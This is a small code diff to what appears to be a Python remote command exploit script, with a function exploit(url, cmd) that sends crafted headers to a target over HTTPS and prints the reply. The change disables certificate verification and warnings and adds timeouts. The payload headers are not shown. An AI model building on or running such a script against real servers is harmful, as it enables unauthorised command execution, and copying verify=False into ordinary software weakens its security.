@@ -1,4 +1,6 @@
 import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import sys
 
 
@@ -26,7 +28,7 @@ def exploit(url, cmd):
     }
     try:
         url = "https://" + url + "/"
-        out = requests.get(url, headers=hearders, allow_redirects=False).text
+        out = requests.get(url, headers=hearders, allow_redirects=False, verify=False, timeout=(10, 27)).text
     except Exception as e:
         out =  str(e)
     print(out)
